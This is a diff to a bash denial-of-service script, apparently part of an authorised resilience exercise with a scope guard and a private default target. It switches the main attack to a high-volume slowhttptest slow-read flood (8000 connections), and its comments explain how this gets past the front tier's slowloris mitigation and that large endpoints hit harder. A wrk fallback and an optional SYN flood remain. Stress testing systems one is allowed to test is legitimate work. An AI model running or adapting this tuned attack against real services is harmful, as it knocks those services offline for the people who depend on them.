@@ -7,7 +7,7 @@
 #   layer remediation usually can't heal and can drown Prometheus/Loki - use
 #   only as a separate secondary scenario, never the recovery demo).
 # Usage: ./dos.sh [TARGET_IP] [PORT] [DURATION_SEC<=60]
-#   Env: ENDPOINT (default /), SYN_FLOOD=1
+#   Env: MODE (slowread default | slowloris), ENDPOINT (default /), CONN, RATE, SYN_FLOOD=1
 # Stop: Ctrl-C, or: pkill -f slowhttptest; pkill -f hping3
 set -euo pipefail
 source "$(dirname "$0")/../_lib/guard.sh"
@@ -16,6 +16,9 @@ TARGET="${1:-${TARGET:-172.16.147.10}}"
 PORT="${2:-${PORT:-8080}}"
 DURATION="${3:-${DURATION:-45}}"
 ENDPOINT="${ENDPOINT:-/}"
+MODE="${MODE:-slowread}"       # slowread (lands here) | slowloris (mitigated by the front tier)
+CONN="${CONN:-8000}"
+RATE="${RATE:-500}"
 SYN_FLOOD="${SYN_FLOOD:-0}"
 ra_require_scope "$TARGET"
 
@@ -41,11 +44,20 @@ cleanup() {
 }
 trap cleanup INT TERM EXIT
 
-# Primary vector (always runs): Slowloris-style HTTP.
+# Primary vector (always runs). slowread is the one that lands here: the front
+# tier absorbs idle slow-HEADER sockets (slowloris) at zero cost, but slow-READ
+# ties up worker/proxy buffers on a body-returning response. A larger ENDPOINT
+# (e.g. the JS bundle) lands harder than "/".
 if command -v slowhttptest >/dev/null 2>&1; then
-  echo "[*] Primary (L7): slowhttptest -> $ENDPOINT"
-  timeout "$DURATION" slowhttptest -c 300 -H -i 10 -r 30 -t GET \
-    -u "http://$TARGET:$PORT$ENDPOINT" -g -o "$OUTDIR/slowhttptest" || true
+  if [ "$MODE" = slowread ]; then
+    echo "[*] Primary (L7): slowhttptest slow-READ (-X) -c $CONN -r $RATE -> $ENDPOINT"
+    timeout "$DURATION" slowhttptest -X -u "http://$TARGET:$PORT$ENDPOINT" \
+      -c "$CONN" -r "$RATE" -n 5 -w 10 -y 20 -z 32 -k 3 -g -o "$OUTDIR/slowhttptest" || true
+  else
+    echo "[*] Primary (L7): slowhttptest slow-HEADERS (-H) -c 300 -> $ENDPOINT  (note: mitigated here)"
+    timeout "$DURATION" slowhttptest -H -t GET -u "http://$TARGET:$PORT$ENDPOINT" \
+      -c 300 -i 10 -r 30 -g -o "$OUTDIR/slowhttptest" || true
+  fi
 elif command -v wrk >/dev/null 2>&1; then
   echo "[*] Primary (L7) fallback: wrk..."
   timeout "$DURATION" wrk -t2 -c100 -d"${DURATION}s" "http://$TARGET:$PORT$ENDPOINT" || true
